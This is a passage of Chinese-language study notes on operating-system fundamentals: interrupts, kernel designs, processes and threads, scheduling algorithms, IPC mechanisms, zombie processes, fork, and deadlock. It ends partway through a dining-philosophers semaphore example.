a. 用户栈是用户进程空间中的一块区域。用于保存应用程序的子程序(函数)间相互调用的参数，返回值，返回点和子程序的局部变量。 
b. 核心栈是内存中操作系统空间的一块区域。用于保存中断现场和保存操作系统程序(函数)间相互调用的参数，返回值，返回点和程序的局部变量。

### 中断分类

- **外中断**：由 CPU 执行指令以外的事件引起，如 I/O 完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等
- **异常**：由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等
- **陷入**：用户程序使用系统调用

### 中断的处理过程

- 保存所有没有被中断硬件保存的寄存器
- 为中断服务程序设置上下文环境，可能包括设置 `TLB`、`MMU` 和页表，如果不太了解这三个概念，请参考另外一篇文章
- 为中断服务程序设置栈
- 对中断控制器作出响应，如果不存在集中的中断控制器，则继续响应中断
- 把寄存器从保存它的地方拷贝到进程表中
- 运行中断服务程序，它会从发出中断的设备控制器的寄存器中提取信息
- 操作系统会选择一个合适的进程来运行。如果中断造成了一些优先级更高的进程变为就绪态，则选择运行这些优先级高的进程
- 为进程设置 MMU 上下文，可能也会需要 TLB，根据实际情况决定
- 加载进程的寄存器，包括 PSW 寄存器
- 开始运行新的进程

上面我们罗列了一些大致的中断步骤，不同性质的操作系统和中断处理程序能够处理的中断步骤和细节也不尽相同，下面是一个嵌套中断的具体运行步骤

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e55f7584a42543ff92cb0214a70ba6b0~tplv-k3u1fbpfcp-watermark.awebp)



### 中断和轮询有什么区别？

- 轮询：CPU对**特定设备**轮流询问。中断：通过**特定事件**提醒CPU。
- 轮询：效率低等待时间长，CPU利用率不高。中断：容易遗漏问题，CPU利用率不高。

## 操作系统内核

- 内核： 是一组程序模块，作为可信软件来提供支持进程并发执行的基本功能和基本操作，通常驻留在内核空间，运行于内核态，具有直接访问硬件设备和所有内存空间的权限，是仅有的能够执行特权指令的程序。
- 内核的功能： 
  a. 中断处理。中断处理是内核中最基本的功能，也是操作系统赖以活动的基础。 
  b. 时钟管理。时钟管理是内核的基本功能。 
  c. 短程调度。短程调度的职责是分配处理器，按照一定的策略管理处理器的转让，以及完成保护和恢复现场工作。 
  d. 原语管理。 原语是内核中实现特定功能的不可中断过程。

### 大内核

- 大内核是将操作系统功能作为一个紧密结合的整体放到内核
- 由于各模块共享信息，因此有很高的性能

### 微内核

为了实现高可靠性，将操作系统划分成小的、层级之间能够更好定义的模块是很有必要的，只有一个模块 --- 微内核 --- 运行在内核态，其余模块可以作为普通用户进程运行。由于把每个设备驱动和文件系统分别作为普通用户进程，这些模块中的错误虽然会使这些模块崩溃，但是不会使整个系统死机。

`MINIX 3` 是微内核的代表作，它的具体结构如下

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6b4acbaaf16f4572b0f03b28f7011c6a~tplv-k3u1fbpfcp-watermark.awebp)

在内核的外部，系统的构造有三层，它们都在用户态下运行，最底层是设备驱动器。由于它们都在用户态下运行，所以不能物理的访问 I/O 端口空间，也不能直接发出 I/O 命令。相反，为了能够对 I/O 设备编程，驱动器构建一个结构，指明哪个参数值写到哪个 I/O 端口，并声称一个内核调用，这样就完成了一次调用过程。

## 为什么 Linux 系统下的应用程序不能直接在 Windows 下运行

这是一个老生常谈的问题了，在这里给出具体的回答。

其中一点是因为 Linux 系统和 Windows 系统的格式不同，**格式就是协议**，就是在固定位置有意义的数据。Linux 下的可执行程序文件格式是 `elf`，可以使用 `readelf` 命令查看 elf 文件头。

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1574a4e2f02c483c908fb9556c482af0~tplv-k3u1fbpfcp-watermark.awebp)

而 Windows 下的可执行程序是 `PE` 格式，它是一种可移植的可执行文件。

还有一点是因为 Linux 系统和 Windows 系统的 `API` 不同，这个 API 指的就是操作系统的 API，Linux 中的 API 被称为`系统调用`，是通过 `int 0x80` 这个软中断实现的。而 Windows 中的 API 是放在动态链接库文件中的，也就是 Windows 开发人员所说的 `DLL` ，这是一个库，里面包含代码和数据。Linux 中的可执行程序获得系统资源的方法和 Windows 不一样，所以显然是不能在 Windows 中运行的。

# 操作系统进程与线程

## 进程与线程的比较

- **进程是资源分配的基本单位**；进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作

- **线程是独立调度的基本单位**；一个进程可以有多个线程，他们共享资源

### 区别

- **拥有资源**：进程是资源分配的基本单位；线程不拥有资源，只可以访问隶属于进程的资源
- **调度**：线程是独立调度的基本单位，在同一个进程中，线程的切换不会引起进程的切换；从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换
- **系统开销**：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销，类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置；而线程切换时只需保存和设置少量寄存器内容，开销很小
- **通信**：线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助 IPC

### 进程之间私有和共享的资源

- 私有：地址空间、堆、全局变量、栈、寄存器
- 共享：代码段，公共数据，进程目录，进程 ID

### 线程之间私有和共享的资源

- 私有：线程栈，寄存器，程序计数器
- 共享：堆，地址空间，全局变量，静态变量

### 多进程与多线程

| 对比维度       | 多进程                                                       | 多线程                                                       | 总结     |
| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------- |
| 数据共享、同步 | 数据共享复杂，需要用 IPC；数据是分开的，同步简单             | 因为共享进程数据，数据共享简单，但也是因为这个原因导致同步复杂 | 各有优势 |
| 内存、CPU      | 占用内存多，切换复杂，CPU 利用率低                           | 占用内存少，切换简单，CPU 利用率高                           | 线程占优 |
| 创建销毁、切换 | 创建销毁、切换复杂，速度慢                                   | 创建销毁、切换简单，速度很快                                 | 线程占优 |
| 编程、调试     | 编程简单，调试简单                                           | 编程复杂，调试复杂                                           | 进程占优 |
| 可靠性         | 进程间不会互相影响                                           | 一个线程挂掉将导致整个进程挂掉                               | 进程占优 |
| 分布式         | 适应于多核、多机分布式；如果一台机器不够，扩展到多台机器比较简单 | 适应于多核分布式                                             | 进程占优 |

### 多进程和多线程优劣

| 优劣 | 多进程                                   | 多线程                                   |
| ---- | ---------------------------------------- | ---------------------------------------- |
| 优点 | 编程、调试简单，可靠性较高               | 创建、销毁、切换速度快，内存、资源占用小 |
| 缺点 | 创建、销毁、切换速度慢，内存、资源占用大 | 编程、调试复杂，可靠性较差               |

### 多进程和多线程选择

- 需要频繁创建销毁的优先用线程
- 需要进行大量计算的优先使用线程
- 强相关的处理用线程，弱相关的处理用进程
- 可能要扩展到多机分布的用进程，多核分布的用线程
- 都满足需求的情况下，用你最熟悉、最拿手的方式

## 什么是进程和进程表

`进程`就是正在执行程序的实例，比如说 Web 程序就是一个进程，shell 也是一个进程，文章编辑器 typora 也是一个进程。

操作系统负责管理所有正在运行的进程，操作系统会为每个进程分配特定的时间来占用 CPU，操作系统还会为每个进程分配特定的资源。

操作系统为了跟踪每个进程的活动状态，维护了一个`进程表`。在进程表的内部，列出了每个进程的状态以及每个进程使用的资源等。

## 什么是上下文切换

对于单核单线程 CPU 而言，在某一时刻只能执行一条 CPU 指令。上下文切换 (Context Switch) 是一种 **将 CPU 资源从一个进程分配给另一个进程的机制**。从用户角度看，计算机能够并行运行多个进程，这恰恰是操作系统通过快速上下文切换造成的结果。在切换的过程中，操作系统需要先存储当前进程的状态 (包括内存空间的指针，当前执行完的指令等等)，再读入下一个进程的状态，然后执行此进程。

## 进程与线程的切换流程？

进程切换分两步：

1、切换**页表**以使用新的地址空间，一旦去切换上下文，处理器中所有已经缓存的内存地址一瞬间都作废了。

2、切换内核栈和硬件上下文。

对于linux来说，线程和进程的最大区别就在于地址空间，对于线程切换，第1步是不需要做的，第2步是进程和线程切换都要做的。

因为每个进程都有自己的虚拟地址空间，而线程是共享所在进程的虚拟地址空间的，因此同一个进程中的线程进行线程切换时不涉及虚拟地址空间的转换。

## 为什么虚拟地址空间切换会比较耗时？

进程都有自己的虚拟地址空间，把虚拟地址转换为物理地址需要查找页表，页表查找是一个很慢的过程，因此通常使用Cache来缓存常用的地址映射，这样可以加速页表查找，这个Cache就是TLB（translation Lookaside Buffer，TLB本质上就是一个Cache，是用来加速页表查找的）。

由于每个进程都有自己的虚拟地址空间，那么显然每个进程都有自己的页表，那么**当进程切换后页表也要进行切换，页表切换后TLB就失效了**，Cache失效导致命中率降低，那么虚拟地址转换为物理地址就会变慢，表现出来的就是程序运行会变慢，而线程切换则不会导致TLB失效，因为线程无需切换地址空间，因此我们通常说线程切换要比进程切换快，原因就在这里。

## 进程详解

### 进程状态

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-15\ProcessState.png" alt="img" style="zoom:80%;" />
</div>


- **就绪状态`ready`**：等待被调度
- **运行状态`running`**：获得调度，运行中
- **等待状态`waiting`**：等待资源（进程缺少响应IO资源；访问正在被其他进程访问的临界资源，等待解锁；进程睡眠）
- **注意**
  - 只有就绪态和运行态可以相互转换，其它的都是单向转换。
  - 就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度
  - 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态

**运行态→阻塞态**：往往是由于等待外设，等待主存等资源分配或等待人工干预而引起的。
**阻塞态→就绪态**：则是等待的条件已满足，只需分配到处理器后就能运行。
**运行态→就绪态**：不是由于自身原因，而是由外界原因使运行状态的进程让出处理器，这时候就变成就绪态。例如时间片用完，或有更高优先级的进程来抢占处理器等。
**就绪态→运行态**：系统按某种策略选中就绪队列中的一个进程占用处理器，此时就变成了运行态。

### 进程调度算法

不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法

#### 批处理系统：

批处理系统没有太多的用户操作，在该系统中，调度算法目标是保证吞吐量和周转时间（从提交到终止的时间）

- **先来先服务 first-come first-serverd（FCFS）**：非抢占式的调度算法，**按照请求的顺序进行调度**；有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长
- **短作业优先 shortest job first（SJF）**：非抢占式的调度算法，**按估计运行时间最短的顺序进行调度**；长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度
- **最短剩余时间优先 shortest remaining time next（SRTN）**：最短作业优先的抢占式版本，按剩余运行时间的顺序进行调度。 当一个新的作业到达时，其整个运行时间与当前进程的剩余时间作比较。如果新的进程需要的时间更少，则挂起当前进程，运行新的进程。否则新的进程等待

#### 交互式系统：

交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应

- **时间片轮转**：将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程；

  - 时间片轮转算法的效率和时间片的大小有很大关系：
  - 因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间；
  - 而如果时间片过长，那么实时性就不能得到保证

- **优先级调度**：为每个进程分配一个优先级，按优先级进行调度；

  - 为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级

- **多级反馈队列**：多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。

  - 进程在第一个队列没执行完，就会被移到下一个队列；
  - 这种方式下，100个时间片的进程只需要交换 7 次；
  - 每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程；
  - 可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合

  <div class="image-wrapper" style="text-align: center">
  <img src="..\\assets\post\2020-02-15\multilevelfeedback.png" alt="img" style="zoom:80%;" />
  </div>

#### 实时系统：

实时系统要求一个请求在一个确定时间内得到响应

分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时

### 影响调度程序的指标是什么

会有下面几个因素决定调度程序的好坏

- CPU 使用率：

CPU 正在执行任务（即不处于空闲状态）的时间百分比。

- 等待时间

这是进程轮流执行的时间，也就是进程切换的时间

- 吞吐量

单位时间内完成进程的数量

- 响应时间

这是从提交流程到获得有用输出所经过的时间。

- 周转时间

从提交流程到完成流程所经过的时间。

### 进程互斥、同步、通信

在多道程序设计系统中，同一时刻可能有许多进程，这些进程之间存在两种基本关系：**竞争关系和协作关系**

- 为了解决进程间**竞争关系**（**间接制约关系**）而引入进程互斥
- 为了解决进程间**松散的协作**关系( **直接制约关系**)而引入进程同步
- 为了解决进程间**紧密的协作**关系而引入进程通信

#### 竞争关系

系统中的多个进程之间彼此无关，它们并不知道其他进程的存在，并且也不受其他进程执行的影响。资源竞争会出现两个控制问题：

- 死锁（deadlock）问题：一组进程如果都获得了部分资源，还想要得到其他进程所占有的资源，最终所有的进程将陷入死锁
- 饥饿（starvation）问题：一个进程由于其他进程总是优先于它而被无限期拖延

**进程的互斥**（mutual exclusion ）是解决进程间竞争关系( **间接制约关系**) 的手段。 进程互斥指若干个进程要使用同一共享资源时，任何时刻最多允许一个进程去使用，其他要使用该资源的进程必须等待，直到占有资源的进程释放该资源。

#### 协作关系

某些进程为完成同一任务需要分工协作，由于合作的每一个进程都是独立地以不可预知的速度推进，这就需要相互协作的进程在某些协调点上协调各自的工作；

当合作进程中的一个到达协调点后，在尚未得到其伙伴进程发来的消息或信号之前应**阻塞**自己，直到其他合作进程发来协调信号或消息后方被唤醒并继续执行；

这种协作进程之间相互等待对方消息或信号的协调关系称为进程同步。

进程间的协作可以是双方不知道对方名字的间接协作，例如，通过共享访问一个缓冲区进行松散式协作；也可以是双方知道对方名字，直接通过通信机制进行紧密协作。

允许进程协同工作**有利于共享信息、有利于加快计算速度、有利于实现模块化程序设计**。

**进程的同步**（Synchronization）是解决进程间协作关系( **直接制约关系**) 的手段。

- 进程同步指两个以上进程基于某个条件来协调它们的活动。一个进程的执行依赖于另一个协作进程的消息或信号，当一个进程没有得到来自于另一个进程的消息或信号时则需等待，直到消息或信号到达才被唤醒。
- **互斥**是一种**特殊的同步**。

**进程同步是一种进程通信**，通过修改信号量，进程之间可以建立联系，相互协调运行和协同工作。但是信号量和PV操作只能传递信号，没有传递数据的能力。

进程之间互相交换信息的工作称之为进程通信IPC（Inter Process Communication），**主要指大量数据的交换**。

### 进程同步

1、**临界区**：通过对多线程的串行化来访问公共资源或一段代码，速度快，适合控制数据访问。

优点：保证在某一时刻只有一个线程能访问数据的简便办法。

缺点：虽然临界区同步速度很快，但却只能用来同步本进程内的线程，而不可用来同步多个进程中的线程。

2、**互斥量**：为协调共同对一个共享资源的单独访问而设计的。互斥量跟临界区很相似，比临界区复杂，互斥对象只有一个，只有拥有互斥对象的线程才具有访问资源的权限。

优点：使用互斥不仅仅能够在同一应用程序不同线程中实现资源的安全共享，而且可以在不同应用程序的线程之间实现对资源的安全共享。

缺点：

- 互斥量是可以命名的，也就是说它可以跨越进程使用，所以创建互斥量需要的资源更多，所以如果只为了在进程内部是用的话使用临界区会带来速度上的优势并能够减少资源占用量。
- 通过互斥量可以指定资源被独占的方式使用，但如果有下面一种情况通过互斥量就无法处理，比如现在一位用户购买了一份三个并发访问许可的数据库系统，可以根据用户购买的访问许可数量来决定有多少个线程/进程能同时进行数据库操作，这时候如果利用互斥量就没有办法完成这个要求，信号量对象可以说是一种资源计数器。

3、**信号量**：为控制一个具有有限数量用户资源而设计。它允许多个线程在同一时刻访问同一资源，但是需要限制在同一时刻访问此资源的最大线程数目。互斥量是信号量的一种特殊情况，当信号量的最大资源数=1就是互斥量了。

优点：适用于对Socket（套接字）程序中线程的同步。

缺点:

- 信号量机制必须有公共内存，不能用于分布式操作系统，这是它最大的弱点；
- 信号量机制功能强大，但使用时对信号量的操作分散， 而且难以控制，读写和维护都很困难，加重了程序员的编码负担；
- 核心操作P-V分散在各用户程序的代码中，不易控制和管理，一旦错误，后果严重，且不易发现和纠正。

4、**事件**： 用来通知线程有一些事件已发生，从而启动后继任务的开始。

优点：事件对象通过通知操作的方式来保持线程的同步，并且可以实现不同进程中的线程同步操作。

### 进程通信

#### 管道

管道是通过调用`pipe`函数创建的，`fd[0]`用于读，`fd[1]`用于写

```c++
#include <unistd.h>
int pipe(int fd[2]);
```

它有以下限制：

- 只支持半双工通信（双向交替传输）
- 只能在父子进程或者兄弟进程中使用

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-15\pipe.png" alt="img" style="zoom:80%;" />
</div>


#### FIFO命名管道

去除了管道中只能在父子进程之间通信的限制

```c++
#include <sys/stat.h>
int mkfifo(const char* path, mode_t mode);
int mkfifoat(int fd, const char* path, mode_t mode);
```

FIFO常用于客户-服务器应用程序中，FIFO 用作汇聚点，在客户进程和服务器进程之间传递数据

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-15\fifo.png" alt="img" style="zoom:80%;" />
</div>


#### 消息队列

相比于 FIFO，消息队列具有以下优点：

- 消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难
- 避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法
- 读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收

缺点：

- 信息的复制需要额外消耗CPU的事件，不适宜用信息量大或者操作频繁的场合

#### 信号量

一个计数器，用于为多个进程提供对共享数据对象的访问

- 优点：可以同步进程
- 缺点：信号量有限

#### 信号

一种比较复杂的通信方式，用于通知接收进程某个事件已经发生

#### 共享存储

允许多个进程共享一个给定的存储区（同一个逻辑内存）。因为数据不需要在进程之间复制，所以这是最快的一种IPC

共享内存并未提供同步机制，所以通常需要使用信号量来同步对共享存储的访问。

多个进程可以将同一个文件映射到它们的地址空间从而实现共享内存。另外 XSI 共享内存不是使用文件，而是使用内存的匿名段。

在linux中，每个进程都有属于自己的**进程控制块（PCB）和地址空间（Addr Space）**，并且都有一个与之对应的**页表**，负责将进程的逻辑地址和物理地址进行映射，通过MMU进行管理。两个不同的虚拟地址通过页表映射到物理空间的同一区域，他们所指向的这块区域就被称为共享内存。

当两个进程通过页表将虚拟地址映射到物理地址时，在物理地址中有一块共同的内存区，即共享内存，这块内存可以被两个内存同时看到。这样，当一个进程进行写操作，另一个进程进行读操作就可以实现进程间通信，同步和互斥可以使用信号量来实现。

优点：

- 快速，方便

缺点：

- 通信是通过将共享空间缓冲区直接附加到进程的虚拟地址空间中来实现的，因此进程间的读写操作的**同步**问题
- 利用内存缓冲区直接交换信息，内存的实体存在于计算机中，只能同一个计算机系统中的诸多进程共享，不方便网络通信

##### 使用方式

```c++
#include <sys/ipc.h>
#include <sys/shm.h>

// 创建或者访问共享内存
int shmget(key_t key, size_t size, int shmflg);

// 附加内存到进程的地址空间
void *shmat(int shmid, const void * shmaddr, int shmflg);

// 从进程的地址空间分离共享内存
int shmdt(const void *shmaddr);

// 控制共享内存
int shmctl(int shmid, int cmd, struct shmid_ds *buf);
// IPC_STAT:获取当前共享内存的`shmid_ds`结构并保存在buf中
// IPC_SET:使用buf中的值设置当前共享内存的shmid_ds结构
// IPC_EMID删除当前共享内存
```

#### socket套接字

与其它通信机制不同的是，它可用于不同机器间的进程通信

- 优点：1，传输数据为字节级别，数据可自定义，数据量小且效率高；2，传输数据时间段，性能高；3，适合客户端和服务端的信息实时交互；4，可以加密，安全性高
- 缺点：需要对数据解析，转化为应用级的数据

### 正常进程、僵尸进程、孤儿进程

- 正常进程

  - 正常情况下，子进程是通过父进程创建的，子进程再创建新的进程。子进程的结束和父进程的运行是一个异步过程，即父进程永远无法预测子进程到底什么时候结束。 当一个进程完成它的工作终止之后，它的父进程需要调用**wait()或者waitpid()**系统调用取得子进程的终止状态。
  - unix提供了一种机制可以保证只要父进程想知道子进程结束时的状态信息， 就可以得到：在每个进程退出的时候，内核释放该进程所有的资源，包括打开的文件，占用的内存等。 但是仍然为其保留一定的信息，直到父进程通过wait / waitpid来取时才释放。保存信息包括：
    - 进程号pid
    - 退出状态
    - 运行时间等

- 孤儿进程

  - 一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。

- 僵尸进程

  - 一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵尸进程。

  - 僵尸进程是一个进程必然会经过的过程：这是每个子进程在结束时都要经过的阶段。

  - 如果子进程在exit()之后，父进程没有来得及处理，这时用ps命令就能看到子进程的状态是“Z”。如果父进程能及时 处理，可能用ps命令就来不及看到子进程的僵尸状态，但这并不等于子进程不经过僵尸状态。

  - 如果父进程在子进程结束之前退出，则子进程将由init接管。init将会以父进程的身份对僵尸状态的子进程进行处理。

  - 危害：

    - 如果进程不调用wait / waitpid的话， 那么保留的那段信息就不会释放，其进程号就会一直被占用，但是系统所能使用的进程号是有限的，如果大量的产生僵死进程，将因为没有可用的进程号而导致系统不能产生新的进程。
  
  -  外部消灭：
    - 通过kill发送SIGTERM或者SIGKILL信号消灭产生僵尸进程的进程，它产生的僵死进程就变成了孤儿进程，这些孤儿进程会被init进程接管，init进程会wait()这些孤儿进程，释放它们占用的系统进程表中的资源
  - 内部解决：
    - 子进程退出时向父进程发送SIGCHILD信号，父进程处理该信号。在信号处理函数中调用wait进行处理僵尸进程。
    - fork两次，原理是将子进程称为孤儿进程，从而它的父进程会变成init进程，通过init进程可以处理僵尸进程。

## fork（pid_t fork(void);）

一个现有进程调用fork()函数创建一个新的进程。

fork函数被调用一次，但是返回两次。两次返回的唯一区别是子进程的返回值是0，父进程的返回值是子进程的pid（错误返回-1）.

父子进程共享代码段，但是分别拥有自己的数据段和堆栈段（现在很多并不真实复制，而是采用写时复制）

### 调用流程

- 给新进程分配一个标识符
- 在内核中分配一个PCB，将其挂在PCB表上
- 复制它的父进程的环境（PCB中大部分的内容）
- 为其分配资源（程序、数据、栈等）
- 复制父进程地址空间的内容（代码共享，数据写时复制）
- 将进程设置为就绪状态，并将其放入就绪队列，等待CPU调度。

### fork和vfork

- fork()的子进程拷贝父进程的数据段和代码的；vfork()的子进程和父进程共享数据段
- fork()的父子进程执行顺序不确定；vfor()保证子进程先运行，在调用exec和exit之前与父进程数据是共享的，调用之后父进程才可能被调度运行；所以如果调用之前子进程依赖于父进程的进一步动作，则会导致死锁

## 线程

###　线程同步

- **临界区（Critical Section）**：通过对多线程的串行化来访问公共资源或一段代码，速度快，适合控制数据访问
- **互斥量（Mutex）**：为协调共同对一个共享资源的单独访问而设计的
- **信号量（Semaphore）**：为控制一个具有有限数量用户资源而设计
- **事件（Event）**：用来通知线程有一些事件已发生，从而启动后继任务的开始

### 线程通信

- 锁机制：
  - 互斥锁：提供了以排他方式防止数据结构被并发修改的方法
  - 读写锁：允许多个线程同时读共享数据，而对写操作是互斥的
  - 自旋锁：与互斥锁类似，都是为了保护共享资源；互斥锁是检测到被占用时睡眠，自旋锁是循环检测是否释放
  - 条件变量：可以以原子的方式阻塞进程，直到某个特定条件为真为止，对条件的检测是在互斥锁的保护下进行的
- 信号量机制：无名线程信号量，命名线程信号量
- 信号机制：类似进程的信号
- 屏障：允许多个线程等待，直到所有的合作线程都到达某一点，然后从该点继续进行

### 线程调度

- 分时调度策略，是一种非实时调度策略，系统会为每个线程分配一段运行时间，称为时间片
- 先来先服务策略，支持优先级抢占。CPU让一个先来的线程执行完再调度下一个线程，顺序就是按照创建线程栈的先后。线程一旦占用cpu就会一直运行，直到有更高级的任务到达或者自己放弃cpu
- 时间片轮转调度策略，但支持优先级抢占，因此是一种实时调度策略。

### 线程的分类？

从线程的运行空间来说，分为用户级线程（user-level thread, ULT）和内核级线程（kernel-level, KLT）

**内核级线程**：这类线程依赖于内核，又称为内核支持的线程或轻量级进程。无论是在用户程序中的线程还是系统进程中的线程，它们的创建、撤销和切换都由内核实现。比如英特尔i5-8250U是4核8线程，这里的线程就是内核级线程

**用户级线程**：它仅存在于用户级中，这种线程是**不依赖于操作系统核心**的。应用进程利用**线程库来完成其创建和管理**，速度比较快，**操作系统内核无法感知用户级线程的存在**。

## 协程

协程（Coroutines）是一种比线程更加轻量级的存在（**本质上协程就是用户空间下的线程**），正如一个进程可以拥有多个线程一样，一个线程可以拥有多个协程。

协程不是被操作系统内核所管理的，而是完全由程序所控制，也就是在用户态执行。这样带来的好处是性能大幅度的提升，因为不会像线程切换那样消耗资源。

协程不是进程也不是线程，而是一个特殊的函数，这个函数可以在某个地方挂起，并且可以重新在挂起处外继续运行。所以说，协程与进程、线程相比并不是一个维度的概念。

## 什么是临界区，如何解决冲突？

每个进程中访问临界资源的那段程序称为临界区，**一次仅允许一个进程使用的资源称为临界资源。**

解决冲突的办法：

- 如果有若干进程要求进入空闲的临界区，**一次仅允许一个进程进入**，如已有进程进入自己的临界区，则其它所有试图进入临界区的进程必须等待；
- 进入临界区的进程要在**有限时间内退出**。
- 如果进程不能进入自己的临界区，则应**让出CPU**，避免进程出现“忙等”现象。

## 死锁

两个或者两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，他们将无法推进下去。

原因：

- 系统资源不足
- 资源分配不当
- 进程推进顺序不合适

### 必要条件

- **互斥**：每个资源要么已经分配给了一个进程，要么就是可用的
- **占有和等待**：已经得到了某个资源的进程可以再请求新的资源
- **不可抢占**：已经分配给一个进程的资源不能强制性的被抢占，他只能被占有他的进程显式释放
- **环路等待**：有两个或者两个以上的进程组成一个环路，该环路中的每个进程都在等待下一个进程所占有的资源

### 编码时解决

- 保证两个互斥量上锁的顺序一致，就不会死锁

- 使用`std::lock()`一次锁住多个互斥量，不存在因为锁头的顺序问题导致的死锁风险问题

- ```c++
  std::lock(mutex1, mutex2);
  std::lock_guard lock1(mutex1, std::adopt_lock);
  std::lock_guard lock2(mutex2, std::adopt_lock);
  ```

### 处理方法

- **鸵鸟策略**：当作没有发生死锁

  - 因为解决死锁的代价很大，因此这种方案可以获得更高的性能；当发生死锁时不会对用户造成很大影响，或者发生死锁的概率很低，可以采用鸵鸟策略；大多数操作系统，包括`unix`，`linux`和`windows`处理死锁问题的办法仅仅是忽略他

- **死锁检测和死锁恢复**：不试图阻止死锁，而是检测到死锁发生时，采取措施进行恢复

  - 每种类型一个资源的死锁检测通过检测有向图是否存在环来实现。
  - 每种类型多个资源的死锁检测
  - 死锁恢复：利用抢占恢复，利用回滚恢复，通过杀死进程恢复

- **死锁预防**：在程序运行之前预防死锁

  - 破坏互斥条件
  - 破坏占有和等待条件：一种方式是规定所有进程在开始执行前请求所需的全部资源
  - 破坏不可抢占条件
  - 破坏环路等待：给资源统一编号，进程只能按照编号顺序来请求资源

- **死锁避免**：在运行时避免发生死锁

  - **安全状态**：是指如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每个进程运行完毕，则称该状态是安全的

    <div class="image-wrapper" style="text-align: center">
    <img src="..\\assets\post\2020-02-15\safestate.png" alt="img" style="zoom:80%;" />
    </div>

  - 上图中，图a的第二列Has表示进程已经拥有的资源数，第三列Max表示进程总共需要的资源数，Free表示还有可以使用的资源数。从图a开始，先让B拥有所需的有时又资源，运行结束后释放B，此时free变为5；以同样方式运行C和A，使得所有进程都能成功运行，因此可以**称A的状态是安全**的。

  - **银行家算法**：判断对请求的满足是否会进入不安全状态，如果是就拒绝请求；否则予以分配

## Linux的四种锁

- **互斥锁**：mutex，用于保证在任何时刻，都只能有一个线程访问该对象，当获取所操作失败时，线程进入睡眠，等待所释放时被唤醒。
- **读写锁**：rwlock，读写锁适合于对数据结构的读次数比写次数多得多的情况。因为读模式锁定时可以共享，以写模式锁住时意味着独占，所以读写锁又叫共享-独占锁。
- **自旋锁**：spinlock，在任何时刻同样只能有一个线程访问对象。但是当获取锁操作失败时，不会进入睡眠，而是会在原地自旋，直到锁被释放。这样节省了线程从睡眠状态到被唤醒期间的消耗，在加锁时间短暂的环境下会极大的提高效率。但如果加锁时间过长，则会非常浪费CPU资源。

## 经典同步问题

### 哲学家进餐问题

多个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。

下面是一种错误的解法，如果所有哲学家同时拿起左手边的筷子，那么所有哲学家都在等待其它哲学家吃完并释放自己手中的筷子，导致死锁。

```c++
#define N 5
void philosopher(int i) {
    while(TRUE) {
        think();
        take(i);       // 拿起左边的筷子
        take((i+1)%N); // 拿起右边的筷子
        eat();
        put(i);
        put((i+1)%N);
    }
}
```

为了防止死锁的发生，可以设置两个条件：

- 必须同时拿起左右两根筷子；
- 只有在两个邻居都没有进餐的情况下才允许进餐。

```c++
#define N 5
#define LEFT (i + N - 1) % N // 左邻居
#define RIGHT (i + 1) % N    // 右邻居
#define THINKING 0
#define HUNGRY   1
#define EATING   2
typedef int semaphore;
int state[N];                // 跟踪每个哲学家的状态
semaphore mutex = 1;         // 临界区的互斥，临界区是 state 数组，对其修改需要互斥
semaphore s[N];              // 每个哲学家一个信号量

void philosopher(int i) {
    while(TRUE) {
        think(i);
        take_two(i);
        eat(i);
        put_two(i);
    }
}

void take_two(int i) {
    down(&mutex);
    state[i] = HUNGRY;
    check(i);
    up(&mutex);
